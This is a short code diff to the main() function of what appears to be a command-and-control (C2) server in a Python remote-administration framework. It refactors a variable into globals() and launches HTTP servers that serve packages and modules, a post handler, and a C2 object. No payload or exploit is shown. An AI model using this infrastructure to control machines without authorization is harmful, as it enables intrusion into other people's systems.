@@ -115,11 +115,11 @@ def main():
         
     if len(site_packages):
         n = 0
-        packages = site_packages[0]
+        globals()['packages'] = site_packages[0]
         for path in site_packages:
             if n < len(os.listdir(path)):
                 n = len(os.listdir(path))
-                packages = path
+                globals()['packages'] = path
     else:
         util.log("unable to locate 'site-packages' in sys.path (directory containing user-installed packages/modules)")
         sys.exit(0)
@@ -133,7 +133,7 @@ def main():
     options = parser.parse_args()
 
     globals()['debug'] = options.debug
-    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True)
+    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
     globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
     globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, options.port + 3), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
